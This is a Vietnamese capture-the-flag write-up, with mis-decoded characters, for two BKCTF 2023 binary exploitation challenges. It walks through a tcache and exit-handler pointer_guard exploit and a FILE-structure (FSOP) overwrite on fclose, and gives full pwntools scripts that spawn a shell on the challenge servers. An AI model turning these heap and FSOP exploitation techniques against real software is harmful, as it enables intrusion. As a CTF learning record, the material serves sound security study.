* Offset `0x30` ·ªü ƒë√¢y l√† tr·ªè ƒë·∫øn `pointer_guard`, nh∆∞ v·∫≠y th√¨ ƒë·ªÉ fake ƒë∆∞·ª£c `func` th√¨ ch√∫ng ta c·∫ßn ph·∫£i leak ƒë∆∞·ª£c `pointer_guard`
* Ch√∫ng ta ch·ªâ c·∫ßn leak ƒë∆∞·ª£c pointer ƒë√£ m√£ h√≥a r·ªìi `xor` v·ªõi h√†m m√† n√≥ tr·ªè t·ªõi l√† s·∫Ω c√≥ ƒë∆∞·ª£c `pointer_guard`
* M·∫∑c ƒë·ªãnh c√°i h√†m n√≥ tr·ªè t·ªõi ·ªü ƒë√¢y s·∫Ω l√† `_dl_fini`, debug ch∆∞∆°ng tr√¨nh s·∫Ω th·∫•y
* Nh∆∞ng m√† h√†m n√†y l·∫°i ·ªü tr√™n `ld.so` nh∆∞ v·∫≠y c·∫ßn leak ƒë∆∞·ª£c c·∫£ `ld`
* ·ªû tr√™n libc m√¨nh t√¨m th·∫•y c√≥ 1 ch·ªó ch·ª©a gi√° tr·ªã c·ªßa `ld`

```bash
0x00007ffff7c00000 0x00007ffff7c28000 0x0000000000000000 r-- /home/nao/bksec_2023/class_manager/bkctf2023-classmanager/downloadable/libc.so.6
0x00007ffff7c28000 0x00007ffff7dbd000 0x0000000000028000 r-x /home/nao/bksec_2023/class_manager/bkctf2023-classmanager/downloadable/libc.so.6
0x00007ffff7dbd000 0x00007ffff7e15000 0x00000000001bd000 r-- /home/nao/bksec_2023/class_manager/bkctf2023-classmanager/downloadable/libc.so.6
0x00007ffff7e15000 0x00007ffff7e19000 0x0000000000214000 r-- /home/nao/bksec_2023/class_manager/bkctf2023-classmanager/downloadable/libc.so.6
0x00007ffff7e19000 0x00007ffff7e1b000 0x0000000000218000 rw- /home/nao/bksec_2023/class_manager/bkctf2023-classmanager/downloadable/libc.so.6
0x00007ffff7e1b000 0x00007ffff7e28000 0x0000000000000000 rw- 
0x00007ffff7fb8000 0x00007ffff7fbd000 0x0000000000000000 rw- 
0x00007ffff7fbd000 0x00007ffff7fc1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fc1000 0x00007ffff7fc3000 0x0000000000000000 r-x [vdso]
0x00007ffff7fc3000 0x00007ffff7fc5000 0x0000000000000000 r-- /home/nao/bksec_2023/class_manager/bkctf2023-classmanager/downloadable/ld-linux-x86-64.so.2
0x00007ffff7fc5000 0x00007ffff7fef000 0x0000000000002000 r-x /home/nao/bksec_2023/class_manager/bkctf2023-classmanager/downloadable/ld-linux-x86-64.so.2
0x00007ffff7fef000 0x00007ffff7ffa000 0x000000000002c000 r-- /home/nao/bksec_2023/class_manager/bkctf2023-classmanager/downloadable/ld-linux-x86-64.so.2
0x00007ffff7ffb000 0x00007ffff7ffd000 0x0000000000037000 r-- /home/nao/bksec_2023/class_manager/bkctf2023-classmanager/downloadable/ld-linux-x86-64.so.2
0x00007ffff7ffd000 0x00007ffff7fff000 0x0000000000039000 rw- /home/nao/bksec_2023/class_manager/bkctf2023-classmanager/downloadable/ld-linux-x86-64.so.2
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 --x [vsyscall]
gef‚û§  x/xg 0x00007ffff7c00000 + 0x219010
0x7ffff7e19010:	0x00007ffff7fd8d30
gef‚û§  p 0x00007ffff7fd8d30 - 0x00007ffff7fc3000
$1 = 0x15d30
```

C√°i n√†y m·ªçi ng∆∞·ªùi c√≥ th·ªÉ ƒë·ªçc ·ªü [ƒë√¢y](https://m101.github.io/binholic/2017/05/20/notes-on-abusing-exit-handlers.html)
### Exploit

* ƒê·∫ßu ti√™n `malloc` `9` chunks v·ªõi size m√† khi `free` s·∫Ω kh√¥ng b·ªã ƒë∆∞a v√†o fastbin. Sau ƒë√≥ `free` `8` chunks ƒë·∫ßu. G·ªçi h√†m `Show` ƒë·ªÉ leak libc v√† heap
* ·ªû ƒë√¢y con tr·ªè `fd` tr√™n heap s·∫Ω ƒë∆∞·ª£c `xor` tr∆∞·ªõc khi ƒë·∫∑t v√†o. N√≥ s·ª≠ d·ª•ng safe linking, `xor` v·ªõi ƒë·ªãa ch·ªâ heap shift `12` bit

```cpp
#define PROTECT_PTR(pos, ptr) \
  ((__typeof (ptr)) ((((size_t) pos) >> 12) ^ ((size_t) ptr)))
#define REVEAL_PTR(ptr)  PROTECT_PTR (&ptr, ptr)
```

* Vi·ªác ƒë∆∞a n√≥ v·ªÅ con tr·ªè ban ƒë·∫ßu c≈©ng ƒë∆°n gi·∫£n v√¨ `12` bits cu·ªëi s·∫Ω gi·ªØ nguy√™n
* ƒÇn tr·ªôm m√£ gi·∫£i tr√™n gg th√¨ m√¨nh c√≥

```python
def deobfuscate(val):
    mask = 0xfff << 52
    while mask:
        v = val & mask
        val ^= (v >> 12)
        mask >>= 12
    return val
```

* R·ªìi b·∫ßy gi·ªù c√≥ libc v√† heap r·ªìi th√¨ exploit c√°i `tcache` ƒë·ªÉ c√≥ arbitrary write
* C√≥ libc r·ªìi th√¨ s·∫Ω leak ƒë∆∞·ª£c `ld` ƒë·ªÉ c√≥ `_dl_fini`
* T√≥m l·∫°i c√°i fake `exit_function` struct s·∫Ω nh∆∞ n√†y sau khi fake

![](https://hackmd.io/_uploads/Sy1EOe16h.png)

* `func` tr·ªè ƒë·∫øn `system`, `arg` tr·ªè ƒë·∫øn `/bin/sh`

![](https://hackmd.io/_uploads/rkIEOg1a2.png)

* Ch·∫°y tr√™n server v√† kh√¥ng c√≥ t√°c d·ª•ng, v√¨ c√°i offset c·ªßa `ld` s·∫Ω kh√°c, tr√™n local th√¨ l√† `0x15d30` c√≤n tr√™n server s·∫Ω thay ƒë·ªïi 1 ch√∫t l√† `0x15c30`

![](https://hackmd.io/_uploads/HkgB2nW6h.png)

* B√†i n√†y c√≥ l·∫Ω sau khi c√≥ `ld` l√† s·∫Ω c√≥ th·ªÉ ƒë·ªçc `ld` ƒë·ªÉ leak `PIE` n·ªØa nh∆∞ng m√¨nh qu√™n

Script

```python
from pwn import *

slnaf = lambda delim, data: p.sendlineafter(delim, data)
saf = lambda delim, data: p.sendafter(delim, data)

elf = context.binary = ELF('babyheap')
libc = ELF('libc.so.6')
ld = ELF('ld-linux-x86-64.so.2')


def create_student(i, length, name):
    slnaf(b'our choice: ', b'1')
    slnaf(b'Where to put that student in the database: ', str(i).encode())
    slnaf(b'Length of that student\'s name: ', str(length).encode())
    slnaf(b'Enter the name: ', name)
def show(i):
    slnaf(b'your choice: ', b'2')
    slnaf(b'Input student ID: ', str(i).encode())
def delete(i):
    slnaf(b'your choice: ', b'3')
    slnaf(b'Input student ID: ', str(i).encode())
def deobfuscate(val):
    mask = 0xfff << 52
    while mask:
        v = val & mask
        val ^= (v >> 12)
        mask >>= 12
    return val
def rightRotate(n, d):
	return (n >> d)|(n << (64 - d)) & 0xffffffffffffffff
def leftRotate(n, d):
     return ((n << d)|(n >> (64 - d))) & 0xffffffffffffffff

p = remote('13.212.34.169', 31527)
#p = process()
#gdb.attach(p, gdbscript='''c''')
NAME = 0x4040c0
KEY = 0x4040a0
STACK = 0x21a530
LIBC_STACK_END = 0x449a90
LEAK_LD_OFFSET = 0x219010
LD_OFFSET = 0x15c0a
_DL_FINI = 0x6040
create_student(0, 0xa0, b'A') 
create_student(1, 0xa0, b'A')
create_student(2, 0xa0, b'A') 
create_student(3, 0xa0, b'A')
create_student(4, 0xa0, b'A') 
create_student(5, 0xa0, b'A')
create_student(6, 0xa0, b'A') 
create_student(7, 0xa0, b'A')
create_student(8, 0xa0, b'A')
for i in range(8):
    delete(i)
show(7)
leak = p.recv(6)
leak = int.from_bytes(leak, byteorder='little')
libc.address = leak - 0x219ce0
print('leak: {}'.format(hex(leak)))
print('libc: {}'.format(hex(libc.address)))
show(6)
leak = p.recvuntil(b'E')[:-1]
leak = int.from_bytes(leak, byteorder='little')
print('leak: {}'.format(hex(leak)))
heap = leak & 0xffffffffffff0000
#for i in range(0xf):
#    tmp = heap + (i << 12)
#    if(((tmp + 0x6c0) >> 12) ^ (tmp + 0x610) == leak):
#        heap = tmp
#        break
heap = deobfuscate(leak)
heap = (heap >> 12) << 12
print('heap: {}'.format(hex(heap))) 
ONE_GADGET = 0xebcf8
create_student(6, 0xa0, p64(((heap + 0x6c0) >> 12) ^ (libc.address + LEAK_LD_OFFSET)))
create_student(9, 0xa0, b'A')
create_student(10, 0xa0, b'')
show(10)
leak = p.recvuntil(b'E')[:-1]
leak = int.from_bytes(leak, byteorder='little')
ld.address = leak - LD_OFFSET
print('leak: {}'.format(hex(leak)))
print('ld: {}'.format(hex(ld.address)))
create_student(0, 0x30, b'A')
create_student(1, 0x30, b'A')
delete(1)
delete(0)
create_student(0, 0x30, p64(((heap + 0x770) >> 12) ^ (libc.address + 0x21af00))) # value in __exit_funcs plus n
create_student(2, 0x30, b'A')
create_student(3, 0x30, b'A'*0x17)
show(3)
p.recvuntil(b'\x41\x41\n')
leak = p.recvuntil(b'E')[:-1]
leak = int.from_bytes(leak, byteorder='little')
print('leak: {}'.format(hex(leak)))
pointer_guard = rightRotate(leak, 0x11) ^ (ld.address + _DL_FINI)
print('pointer guard: {}'.format(hex(pointer_guard)))
pointer_encoded = leftRotate((libc.symbols['system'] ^ pointer_guard), 0x11)
print(hex(pointer_encoded))
create_student(3, 0x30,p64(0) + p64(1) + p64(4) + p64(pointer_encoded) + p64(next(libc.search(b'/bin/sh\x00'))))

slnaf(b'your choice: ', b'4')
p.interactive()

```

## File scanner

![](https://hackmd.io/_uploads/S1iXZTW6h.png)

Ch·∫°y ch∆∞∆°ng tr√¨nh th√¨ n√≥ h·ªèi c√≥ ph·∫£i huster kh√¥ng, ehhh kh√¥ng
Nh·∫≠p v√†o ID r·ªìi n√≥ tho√°t

### Decompile program

H√†m `main`

```cpp
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  int v4; // [esp-Ch] [ebp-44h]
  int v5; // [esp-Ch] [ebp-44h]
  int v6; // [esp-Ch] [ebp-44h]
  int v7; // [esp-8h] [ebp-40h]
  int v8; // [esp-4h] [ebp-3Ch]
  int v9; // [esp+0h] [ebp-38h] BYREF
  int i; // [esp+4h] [ebp-34h]
  int v11; // [esp+8h] [ebp-30h]
  char v12[16]; // [esp+Ch] [ebp-2Ch] BYREF
  char v13[16]; // [esp+1Ch] [ebp-1Ch] BYREF
  unsigned int v14; // [esp+2Ch] [ebp-Ch]

  v14 = __readgsdword(0x14u);
  init();
  v3 = time(0);
  srand(v3);
  for ( i = 0; i <= 15; ++i )
    v13[i] = generateRandomHexValue();
  memset(v12, 0, sizeof(v12));
  printf("Are you Huster? Show me your ID: ");
  custom_read(v12);
  v11 = strlen(v12, 16);
  if ( !strncmp(v12, v13, v11) )
  {
    puts("Ohh... so you can use the newest tool I just found");
    puts("Please don't break my program T_T\n");
  }
  else
  {
    printf("Do you forgot your ID, so badd !!!");
    exit(1, v4, v7, v8);
  }
  while ( 1 )
  {
    menu();
    __isoc99_scanf("%d", &v9);
    if ( v9 == 2 )
    {
      readFile();
      goto LABEL_21;
    }
    if ( v9 > 2 )
    {
      if ( v9 == 3 )
      {
        printFileContent();
        goto LABEL_21;
      }
      if ( v9 == 4 )
      {
        puts("oh... I forgot asking your name");
        printf("What is your name: ");
        __isoc99_scanf("%s", name);
        printf("See you soon, %s !!!\n", name);
        if ( filePtr )
          fclose(filePtr);
        exit(1, v6, v7, v8);
      }
    }
    else if ( v9 == 1 )
    {
      openFile();
      goto LABEL_21;
    }
    puts("Invalid choice");
    exit(1, v5, v7, v8);
LABEL_21:
    putchar(10);
  }
}
```

* C√°i v·ª• huster l√† ch∆∞∆°ng tr√¨nh random 1 c√°i strings r·ªìi check xem c√°i input ng∆∞·ªùi d√πng c√≥ tr√πng v·ªõi c√°i string ƒë·∫•y kh√¥ng qua h√†m `strncmp`
* Ta th·∫•y c√°i argument th·ª© 3 l√† ƒë·ªô d√†i c·ªßa c√°i string m√¨nh pass cho ch∆∞∆°ng tr√¨nh th√¨ `strncmp` s·∫Ω ki·ªÉm tra v·ªõi ƒë·ªô d√†i ƒë√≥, t√≥m l·∫°i size b·∫±ng `0` l√† s·∫Ω pass

![](https://hackmd.io/_uploads/r1uWG6-a2.png)

H√†m `open`

```cpp
unsigned int openFile()
{
  char v1[100]; // [esp+8h] [ebp-70h] BYREF
  unsigned int v2; // [esp+6Ch] [ebp-Ch]

  v2 = __readgsdword(0x14u);
  if ( filePtr )
  {
    puts("A file is already opened. Please close it before opening a new file.");
  }
  else
  {
    printf("Enter the filename: ");
    __isoc99_scanf("%99s", v1);
    if ( strstr(v1, "flag") )
    {
      puts("Ha, what are you trying to do ?!");
    }
    else
    {
      filePtr = fopen(v1, "r");
      if ( filePtr )
        puts("Ok, this file is yours");
      else
        puts("Failed to open the file.");
    }
  }
  return __readgsdword(0x14u) ^ v2;
}
```

* N√≥ y√™u c·∫ßu nh·∫≠p 1 c√°i file name(kh√¥ng c√≥ "flag") r·ªìi m·ªü file. S·ª≠ d·ª•ng `fopen` s·∫Ω tr·∫£ v·ªÅ 1 `IO_FILE_plus` struct ƒë∆∞·ª£c l∆∞u v√†o `filePtr`

H√†m `read`

```cpp
int readFile()
{
  memset(&fileContent, 0, 1000);
  if ( !filePtr )
    return puts("No file is currently opened.");
  if ( fgets(&fileContent, 1000, filePtr) )
    return puts("Read successful");
  return puts("Failed to read the file.");
}
```

* N√≥ ƒë·ªçc `1000` bytes ho·∫∑c ƒë·∫øn `\n` v√† l∆∞u data v√†o `fileContent`

H√†m `print`

```cpp
int printFileContent()
{
  int v1; // [esp-Ch] [ebp-14h]
  int v2; // [esp-8h] [ebp-10h]
  int v3; // [esp-4h] [ebp-Ch]

  if ( strchr(&fileContent, 125) )
  {
    puts("Nothing for you!!! Bye~");
    exit(1, v1, v2, v3);
  }
  return puts(&fileContent);
}
```

* N√≥ ki·ªÉm tra tr√™n `fileContent` m√† kh√¥ng c√≥ `}` th√¨ in ra
* Cu·ªëi c√πng l√† khi m√¨nh ch·ªçn `4` ƒë·ªÉ `exit` th√¨ tr∆∞·ªõc ƒë√≥ ch∆∞∆°ng tr√¨nh s·∫Ω y√™u c·∫ßu nh·∫≠p t√™n m√† c√°i con tr·ªè `name` n√†y l·∫°i ·ªü tr∆∞·ªõc `filePtr`

![](https://hackmd.io/_uploads/SkIvmpZp3.png)

* ·ªû ƒë√¢y ta c√≥ th·ªÉ overflow `filePtr` ƒë·ªÉ khi ƒë∆∞a v√†o `fclose` th√¨ h√†m n√†y s·∫Ω l√†m g√¨ ƒë√≥ ƒë√≥
* Ch∆∞∆°ng tr√¨nh kh√¥ng b·∫≠t PIE v√† l√† 32 bits n√™n vi·ªác ghi kh√¥ng b·ªã kh√≥ khƒÉn b·ªüi `NULL` byte

### LEAK LIBC

* ƒê·ªÉ leak libc th√¨ m√¨nh ƒë·ªçc file `/proc/self/maps`

V√≠ d·ª• v·ªÅ file ƒë√≥ ·ªü `/usr/bin/cat`

![](https://hackmd.io/_uploads/SJvLVabTn.png)

* C√°i h√†m `read` ch·ªâ ƒë·ªçc 1 d√≤ng 1 l·∫ßn nh∆∞ v·∫≠y ƒë·ªÉ in d√≤ng `n` th√¨ m√¨nh `read` `n` l·∫ßn r·ªìi m·ªõi `print`

* H√†m ƒë·ªÉ t√¨m libc

```python
while(1):
    for j in range(i):
        read_file()
    write_file()
    leak = p.recvuntil(b'---------------MENU---------------')
    if(b'libc_32' in leak):
        break
    i += 1
```

* R·ªìi gi·ªù th√¨ ƒë√£ c√≥ libc

### FSOP

H√†m `fclose`

```cpp
int _IO_new_fclose (_IO_FILE *fp)
{
  int status;

  CHECK_FILE(fp, EOF);

#if SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_1)
  /* We desperately try to help programs which are using streams in a
     strange way and mix old and new functions.  Detect old streams
     here.  */
  if (_IO_vtable_offset (fp) != 0)
    return _IO_old_fclose (fp);
#endif

  /* First unlink the stream.  */
  if (fp->_IO_file_flags & _IO_IS_FILEBUF)
    _IO_un_link ((struct _IO_FILE_plus *) fp);

  _IO_acquire_lock (fp);
  if (fp->_IO_file_flags & _IO_IS_FILEBUF)
    status = _IO_file_close_it (fp);
  else
    status = fp->_flags & _IO_ERR_SEEN ? -1 : 0;
  _IO_release_lock (fp);
  _IO_FINISH (fp);
  if (fp->_mode > 0)
    {
#if _LIBC
      /* This stream has a wide orientation.  This means we have to free
	 the conversion functions.  */
      struct _IO_codecvt *cc = fp->_codecvt;

      __libc_lock_lock (__gconv_lock);
      __gconv_release_step (cc->__cd_in.__cd.__steps);
      __gconv_release_step (cc->__cd_out.__cd.__steps);
      __libc_lock_unlock (__gconv_lock);
#endif
    }
  else
    {
      if (_IO_have_backup (fp))
	_IO_free_backup_area (fp);
    }
  if (fp != _IO_stdin && fp != _IO_stdout && fp != _IO_stderr)
    {
      fp->_IO_file_flags = 0;
      free(fp);
    }

  return status;
}
```

* `CHECKFILE` ki·ªÉm tra gi√° tr·ªã magic tr√™n `flags` c·ªßa `_IO_FILE` struct. ƒê·∫°i lo·∫°i l√† `4` bytes cu·ªëi s·∫Ω l√† `0xfbad`
* Ta c√≥ c√°i file struct

```cpp
struct _IO_FILE_plus
{
  _IO_FILE file;
  const struct _IO_jump_t *vtable;
};
```

```cpp
struct _IO_FILE {
  int _flags;		/* High-order word is _IO_MAGIC; rest is flags. */
#define _IO_file_flags _flags

  /* The following pointers correspond to the C++ streambuf protocol. */
  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
  char* _IO_read_ptr;	/* Current read pointer */
  char* _IO_read_end;	/* End of get area. */
  char* _IO_read_base;	/* Start of putback+get area. */
  char* _IO_write_base;	/* Start of put area. */
  char* _IO_write_ptr;	/* Current put pointer. */
  char* _IO_write_end;	/* End of put area. */
  char* _IO_buf_base;	/* Start of reserve area. */
  char* _IO_buf_end;	/* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */

  struct _IO_marker *_markers;

  struct _IO_FILE *_chain;

  int _fileno;
#if 0
  int _blksize;
#else
  int _flags2;
#endif
  _IO_off_t _old_offset; /* This used to be _offset but it's too small.  */

#define __HAVE_COLUMN /* temporary */
  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];

  /*  char* _save_gptr;  char* _save_egptr; */

  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
};
```

```cpp
struct _IO_jump_t
{
    JUMP_FIELD(size_t, __dummy);
    JUMP_FIELD(size_t, __dummy2);
    JUMP_FIELD(_IO_finish_t, __finish);
    JUMP_FIELD(_IO_overflow_t, __overflow);
    JUMP_FIELD(_IO_underflow_t, __underflow);
    JUMP_FIELD(_IO_underflow_t, __uflow);
    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
    /* showmany */
    JUMP_FIELD(_IO_xsputn_t, __xsputn);
    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
    JUMP_FIELD(_IO_seekoff_t, __seekoff);
    JUMP_FIELD(_IO_seekpos_t, __seekpos);
    JUMP_FIELD(_IO_setbuf_t, __setbuf);
    JUMP_FIELD(_IO_sync_t, __sync);
    JUMP_FIELD(_IO_doallocate_t, __doallocate);
    JUMP_FIELD(_IO_read_t, __read);
    JUMP_FIELD(_IO_write_t, __write);
    JUMP_FIELD(_IO_seek_t, __seek);
    JUMP_FIELD(_IO_close_t, __close);
    JUMP_FIELD(_IO_stat_t, __stat);
    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
    JUMP_FIELD(_IO_imbue_t, __imbue);
#if 0
    get_column;
    set_column;
#endif
};
```

* ·ªû ch·ªó n√†y trong `fclose`

```cpp
if (fp->_IO_file_flags & _IO_IS_FILEBUF)
    _IO_un_link ((struct _IO_FILE_plus *) fp);
```

```cpp
#define _IO_IS_FILEBUF 0x2000
```

* M√¨nh ko set c√°i bit ƒë·∫•y ƒë·ªÉ n√≥ kh√¥ng ch·∫°y v√†o `_IO_un_link`
* C·∫£ c√°i n√†y n·ªØa

```cpp
if (fp->_IO_file_flags & _IO_IS_FILEBUF)
    status = _IO_file_close_it (fp);
```
* R·ªìi n√≥ s·∫Ω ch·∫°y `_IO_FINISH(fp)`

```cpp
#define _IO_FINISH(FP) JUMP1 (__finish, FP, 0)
#define JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)->FUNC) (THIS, X1)
```

* M√¨nh fake c√°i `filePtr` v·ªÅ `name` th√¨ `name` s·∫Ω l√† `fp`, th√¨ ·ªü ƒë√¢y m√¨nh set c√°i `vtable` v·ªÅ `name + 0x10` th√¨ ch∆∞∆°ng tr√¨nh s·∫Ω g·ªçi `(name + 0x10 + 0x4*3)()`
* M√¨nh ƒë·ªÉ c√°i gi√° tr·ªã ƒë·∫•y l√† `system`
* Ch∆∞∆°ng tr√¨nh g·ªçi `_IO_FINISH` v·ªõi argument l√† file struct n√™n khi nh·∫≠p t√™n sau c√°i `flags` m√¨nh ƒë·ªÉ `;/bin/sh...` th√¨ s·∫Ω c√≥ ƒë∆∞·ª£c shell

![](https://hackmd.io/_uploads/rJi3waWp2.jpg)

![](https://hackmd.io/_uploads/H1SCDpZ6h.png)

Script

```python
from pwn import *

slnaf = lambda delim, data: p.sendlineafter(delim, data)

elf = context.binary = ELF('file_scanner')
libc = ELF('libc_32.so.6')

def open_file(name):
    slnaf(b'Your choice :', b'1')
    slnaf(b'Enter the filename: ', name)
def read_file():
    slnaf(b'Your choice :', b'2')
def write_file():
    slnaf(b'Your choice :', b'3')



#p = remote('18.141.143.171', 30914)
p = process()
gdb.attach(p, gdbscript='''
           break fclose
           break *0x8048cc9
           break exit
           c
#                            ''')


NAME = 0x804b0a0
p.sendlineafter(b're you Huster? Show me your ID:', b'')
open_file(b'/proc/self/maps')
i = 1
while(1):
    for j in range(i):
        read_file()
    write_file()
    leak = p.recvuntil(b'---------------MENU---------------')
    if(b'libc' in leak):
        break
    i += 1
leak = leak[:8]
leak = int(leak.decode(), 16)
print('leak: {}'.format(hex(leak)))
libc.address = leak
print('system: {}'.format(hex(libc.symbols['system'])))
payload = p32(0xfbad0101)
payload += b';/bin/sh;'.ljust(20, b'A')
payload += p32(libc.symbols['system'])
payload += b'A'*4
payload += p32(NAME)
payload += p32(NAME - 0x10)*0xa
payload += p32(NAME + 0x10)
payload += p32(NAME - 0x10)*0x10
slnaf(b'Your choice :', b'4')
slnaf(b'What is your name: ', payload)
p.interactive()

```

# RE
### Checker

Author: `PhucRio`

Source code [here](https://github.com/TaiPhung217/CTF_writeup/blob/main/2023/bkctf%202023/bkctf2023-checker.zip).

`https://hackmd.io/LShuh2sWTf6GQfcB_xn-xQ`